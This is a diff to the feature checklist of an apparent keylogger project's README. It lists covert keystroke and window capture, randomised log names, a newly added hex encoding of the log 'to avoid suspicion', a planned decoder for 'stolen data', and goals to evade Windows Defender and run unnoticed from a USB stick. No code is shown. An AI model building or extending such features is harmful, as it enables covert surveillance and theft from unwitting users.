@@ -15,6 +15,8 @@ The keylog file will also never touch the disk and only the usb drive that it is
 - [X] collect keystrokes unknowingly to the user.
 - [X] along with keystrokes include the active window where typing happened and note when window is changed
 - [X] randomize key log file name.
+- [X] encode log in hex to avoid suspicion if log file is found while in operation.
+- [ ] create a small script that converts back to normal text for easy viewing of stolen data.
 - [ ] compile to exe and be unnoticeable when opened.
 - [ ] Undetected by windows Defender
 - [ ] save keystrokes to usb stick that script is on.
